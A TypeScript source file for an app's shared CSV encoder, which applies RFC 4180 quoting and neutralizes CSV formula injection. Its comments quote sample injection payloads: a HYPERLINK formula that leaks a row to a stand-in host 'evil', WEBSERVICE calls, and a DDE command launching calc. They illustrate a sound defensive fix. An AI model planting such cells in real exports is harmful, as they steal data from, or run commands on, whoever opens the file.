// SPDX-License-Identifier: AGPL-3.0-only
// The one CSV field encoder for every export in this app.
//
// It does two things, and they are not the same thing:
//
//  1. **RFC 4180 quoting** — so a comma, a quote or a newline inside a value cannot restructure the
//     file. That is a correctness concern.
//  2. **Formula neutralization** — so a spreadsheet does not *evaluate* a value. That is a security
//     concern, and quoting does nothing for it: Excel and LibreOffice strip the quotes while
//     parsing and then evaluate any cell whose text begins with `=`, `+`, `-`, `@`, TAB or CR. A
//     cell reading `=HYPERLINK("http://evil/?"&A1,"Click")` or `=WEBSERVICE(...)` exfiltrates the
//     row it sits next to, on open, with one click.
//
// (2) matters here because Yagra's exports carry text Yagra did not author. The audit log records
// the username submitted to a *failed* login, so anyone who can reach the sign-in page can plant a
// cell that an admin later opens; the Troubleshoot exports carry device-supplied strings (syslog
// messages, sysName), which `.claude/rules/security.md` classifies as untrusted. Both land in a
// file whose reader has more privilege than whoever wrote the value.
//
// This lives in `lib/` because it was previously two byte-identical copies (`pages/auditRow.ts`
// and `troubleshoot/report/format.ts`). A rule about untrusted text held in two places is two
// places a fix has to land, and the copy that is missed keeps executing.

/**
 * The characters a spreadsheet reads as "this cell is a formula" (OWASP CSV-injection guidance).
 *
 * Iterable at runtime so the test can demand coverage of every member rather than restating the
 * list — the convention in `.claude/rules/extensibility.md` §4.
 */
export const FORMULA_TRIGGERS = ['=', '+', '-', '@', '\t', '\r'] as const;

/**
 * The one exemption to the rule above: a value that is *entirely* a negative decimal literal.
 *
 * Deliberate, and the deciding fact is in this repo rather than in OWASP's guidance. The
 * Troubleshoot CSVs export a correlation coefficient (`r`) and a capacity slope (`slope_per_day`);
 * `r` is negative for every *inverse* correlation, which is a first-class result the reports label
 * in their own right (`correlationDirection`). Neutralizing those would leave the `r` column
 * **text for half its rows and numeric for the other half**, and a mixed-type column does not
 * merely look wrong — it sorts wrong, silently. A uniformly-text column would be ugly; a half-text
 * one mis-orders an operator's diagnostic export while looking fine. So `-5` is left alone.
 *
 * The exemption is safe because it is a closed shape, not a parser: anchored end to end over
 * digits, at most one `.`, and an optional exponent. It admits no identifier, no `(`, no `!`, no
 * `|` and no quote, so nothing matching it can name a function, a DDE target or a cell reference —
 * a spreadsheet evaluates it to the number and stops. Anything else starting with `-`
 * (`-5+cmd|' /C calc'!A0`, `-1;=WEBSERVICE(…)`) fails the anchors and is neutralized.
 *
 * It leans on one JS-specific detail worth naming: without the `m` flag, `$` matches only at end of
 * input (unlike Python's, which also matches before a trailing newline), so `-5\n=HYPERLINK(…)`
 * cannot smuggle a payload past it. `csv.test.ts` pins that rather than assuming it.
 *
 * Only `-` gets an exemption: it is the only trigger character a stringified number can begin with
 * (`String(+5)` is `"5"`), so widening this to the others would buy nothing and cost the guarantee.
 */
const NEGATIVE_NUMBER = /^-(?:\d+\.?\d*|\.\d+)(?:[eE][+-]?\d+)?$/;

/** Whether a value would be read as a formula, after the numeric exemption. */
function isFormulaLike(s: string): boolean {
  if (s.length === 0) return false;
  if (!(FORMULA_TRIGGERS as readonly string[]).includes(s[0])) return false;
  return !NEGATIVE_NUMBER.test(s);
}

/**
 * Encode one CSV field: neutralize a formula-triggering value with a leading apostrophe, then quote
 * per RFC 4180 (wrap in quotes, double any embedded quote).
 *
 * Quoting is unconditional rather than "quote when it contains a comma": the values here include
 * text a caller chose, so deciding per value is a rule that can be got wrong once and corrupt every
 * row after it.
 *
 * The apostrophe goes *inside* the quotes because that is where the cell's text begins — a
 * spreadsheet consumes it as the "treat this as literal text" marker and displays the value
 * unchanged. Output for a benign value is byte-identical to plain RFC 4180 quoting; only a value
 * that would otherwise have been executed gains a character.
 */
export function csvField(v: string | number): string {
  const s = String(v);
  const body = isFormulaLike(s) ? `'${s}` : s;
  return `"${body.replace(/"/g, '""')}"`;
}
